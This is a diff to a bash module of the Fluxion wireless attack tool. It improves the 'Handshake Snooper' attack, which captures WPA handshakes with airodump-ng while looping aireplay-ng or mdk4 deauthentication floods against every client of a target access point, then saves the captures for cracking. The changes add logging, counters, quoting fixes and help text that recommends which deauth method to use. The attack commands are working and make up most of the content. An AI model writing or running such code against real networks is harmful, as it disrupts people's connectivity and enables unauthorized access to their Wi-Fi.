@@ -59,15 +59,32 @@ handshake_snooper_arbiter_daemon() {
   echo -e "[$now] $HandshakeSnooperStartingArbiterNotice" > \
     "$FLUXIONWorkspacePath/handshake_snooper.log"
 
+  now=$(env -i date '+%H:%M:%S')
+  echo -e "[$now] Target BSSID: $FluxionTargetMAC | ESSID: $FluxionTargetSSID | Channel: $FluxionTargetChannel" >> \
+    "$FLUXIONWorkspacePath/handshake_snooper.log"
+  echo -e "[$now] Deauth method: $HandshakeSnooperDeauthenticatorIdentifier" >> \
+    "$FLUXIONWorkspacePath/handshake_snooper.log"
+  echo -e "[$now] Verifier: $HandshakeSnooperVerifierIdentifier (every ${HandshakeSnooperVerifierInterval}s, $HandshakeSnooperVerifierSynchronicity)" >> \
+    "$FLUXIONWorkspacePath/handshake_snooper.log"
+
+  now=$(env -i date '+%H:%M:%S')
+  echo -e "[$now] Starting packet captor on interface..." >> \
+    "$FLUXIONWorkspacePath/handshake_snooper.log"
   handshake_snooper_start_captor
+
+  now=$(env -i date '+%H:%M:%S')
+  echo -e "[$now] Starting deauthenticator..." >> \
+    "$FLUXIONWorkspacePath/handshake_snooper.log"
   handshake_snooper_start_deauthenticator
 
   local handshake_snooper_arbiter_daemon_verified=1 # Assume it hasn't been verified yet (1 => false/error).
+  local handshake_snooper_arbiter_check_count=0
 
   # Keep snooping and verifying until we've got a valid hash from the capture file.
   while [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; do
+    handshake_snooper_arbiter_check_count=$((handshake_snooper_arbiter_check_count + 1))
     now=$(env -i date '+%H:%M:%S')
-    echo -e "[$now] $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
+    echo -e "[$now] ${CYel}Verification round #$handshake_snooper_arbiter_check_count${CClr} - $(io_dynamic_output $HandshakeSnooperSnoopingForNSecondsNotice)" >> \
       "$FLUXIONWorkspacePath/handshake_snooper.log"
     sleep $HandshakeSnooperVerifierInterval &
     wait $! # Using wait to asynchronously catch flags while waiting.
@@ -79,16 +96,21 @@ handshake_snooper_arbiter_daemon() {
         "$FLUXIONWorkspacePath/handshake_snooper.log"
       handshake_snooper_stop_deauthenticator
       handshake_snooper_stop_captor
-      mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
-        "$FLUXIONWorkspacePath/capture/recent.cap"
+      # Before moving, check the capture file exists
+      if [ -f "$FLUXIONWorkspacePath/capture/dump-01.cap" ]; then
+        mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
+          "$FLUXIONWorkspacePath/capture/recent.cap"
+      fi
     else
       if [ -x "$(command -v pyrit)" ]; then
         pyrit -r "$FLUXIONWorkspacePath/capture/dump-01.cap" \
           -o "$FLUXIONWorkspacePath/capture/recent.cap" stripLive &> \
           $FLUXIONOutputDevice
       else
-        mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
-           "$FLUXIONWorkspacePath/capture/recent.cap" &> $FLUXIONOutputDevice
+        if [ -f "$FLUXIONWorkspacePath/capture/dump-01.cap" ]; then
+          mv "$FLUXIONWorkspacePath/capture/dump-01.cap" \
+            "$FLUXIONWorkspacePath/capture/recent.cap" &> "$FLUXIONOutputDevice"
+        fi
       fi
     fi
 
@@ -100,11 +122,20 @@ handshake_snooper_arbiter_daemon() {
       "$FluxionTargetSSID" "$FluxionTargetMAC"
     handshake_snooper_arbiter_daemon_verified=$?
 
+    if [ $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
+      now=$(env -i date '+%H:%M:%S')
+      echo -e "[$now] ${CRed}No valid handshake found yet.${CClr} Continuing capture (round #$handshake_snooper_arbiter_check_count completed)..." >> \
+        "$FLUXIONWorkspacePath/handshake_snooper.log"
+    fi
+
     # If synchronously searching, restart the captor and deauthenticator after checking.
     if [ "$HandshakeSnooperVerifierSynchronicity" = "blocking" -a \
       $handshake_snooper_arbiter_daemon_verified -ne 0 ]; then
       sandbox_remove_workfile "$FLUXIONWorkspacePath/capture/*"
 
+      now=$(env -i date '+%H:%M:%S')
+      echo -e "[$now] Restarting captor and deauthenticator for next round..." >> \
+        "$FLUXIONWorkspacePath/handshake_snooper.log"
       handshake_snooper_start_captor
       handshake_snooper_start_deauthenticator
     fi
@@ -123,9 +154,11 @@ handshake_snooper_arbiter_daemon() {
   # Assure we've got a directory to store hashes into.
   mkdir -p "$FLUXIONPath/attacks/Handshake Snooper/handshakes/"
 
-  # Move handshake to storage if one was acquired.
+  # Move handshake to storage if one was acquired (include timestamp for uniqueness).
+  local captureTimestamp
+  captureTimestamp=$(env -i date '+%Y%m%d_%H%M%S')
   mv "$FLUXIONWorkspacePath/capture/recent.cap" \
-    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC.cap"
+    "$FLUXIONPath/attacks/Handshake Snooper/handshakes/$FluxionTargetSSIDClean-$FluxionTargetMAC-$captureTimestamp.cap"
 
   # Signal parent process the verification terminated.
   kill -s SIGABRT $1
@@ -162,7 +195,7 @@ handshake_snooper_start_captor() {
 
   xterm $FLUXIONHoldXterm -title "Handshake Captor (CH $FluxionTargetChannel)" \
     $TOPLEFT -bg "#000000" -fg "#FFFFFF" -e \
-    airodump-ng --ignore-negative-one -d $FluxionTargetMAC -w "$FLUXIONWorkspacePath/capture/dump" -c $FluxionTargetChannel -a $HandshakeSnooperJammerInterface &
+    airodump-ng --ignore-negative-one -d "$FluxionTargetMAC" -w "$FLUXIONWorkspacePath/capture/dump" -c "$FluxionTargetChannel" -a "$HandshakeSnooperJammerInterface" &
   local parentPID=$!
 
   while [ ! "$HandshakeSnooperCaptorPID" ]; do
@@ -204,7 +237,7 @@ handshake_snooper_start_deauthenticator() {
   # Prepare deauthenticators
   case "$HandshakeSnooperDeauthenticatorIdentifier" in
     "$HandshakeSnooperMdk4MethodOption")
-      echo "$FluxionTargetMAC" > $FLUXIONWorkspacePath/mdk4_blacklist.lst ;;
+      echo "$FluxionTargetMAC" > "$FLUXIONWorkspacePath/mdk4_blacklist.lst" ;;
   esac
 
   # Start deauthenticators.
@@ -212,13 +245,13 @@ handshake_snooper_start_deauthenticator() {
     "$HandshakeSnooperAireplayMethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 aireplay-ng --deauth=100 -a $FluxionTargetMAC --ignore-negative-one $HandshakeSnooperJammerInterface; done" &
+        "deauth_count=0; while true; do deauth_count=\$((deauth_count + 1)); echo \"[\$(date '+%H:%M:%S')] Deauth attempt #\$deauth_count - sending 100 frames to '$FluxionTargetMAC'...\"; sleep 7; timeout 3 aireplay-ng --deauth=100 -a '$FluxionTargetMAC' --ignore-negative-one '$HandshakeSnooperJammerInterface'; done" &
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
     "$HandshakeSnooperMdk4MethodOption")
       xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" \
         -title "Deauthenticating all clients on $FluxionTargetSSID" -e \
-        "while true; do sleep 7; timeout 3 mdk4 $HandshakeSnooperJammerInterface d -b $FLUXIONWorkspacePath/mdk4_blacklist.lst -c $FluxionTargetChannel; done" &
+        "deauth_count=0; while true; do deauth_count=\$((deauth_count + 1)); echo \"[\$(date '+%H:%M:%S')] Deauth attempt #\$deauth_count via mdk4 on channel '$FluxionTargetChannel'...\"; sleep 7; timeout 3 mdk4 '$HandshakeSnooperJammerInterface' d -b '$FLUXIONWorkspacePath/mdk4_blacklist.lst' -c '$FluxionTargetChannel'; done" &
       HandshakeSnooperDeauthenticatorPID=$!
     ;;
   esac
@@ -241,6 +274,15 @@ handshake_snooper_set_deauthenticator_identifier() {
     "$HandshakeSnooperMdk4MethodOption"
     "$FLUXIONGeneralBackOption"
   )
+
+  # Display descriptions for each deauth method to help users choose.
+  echo
+  echo -e "  ${CCyn}Method descriptions:${CClr}"
+  echo -e "    ${CGrn}mdk4${CClr}:        Recommended - More reliable, supports targeted deauth"
+  echo -e "    ${CGrn}aireplay-ng${CClr}: Classic - Simple deauth, widely compatible"
+  echo -e "    ${CGrn}Monitor${CClr}:     Passive - No deauth, wait for handshake naturally"
+  echo
+
   io_query_choice "$HandshakeSnooperMethodQuery" methods[@]
 
   HandshakeSnooperDeauthenticatorIdentifier=$IOQueryChoice
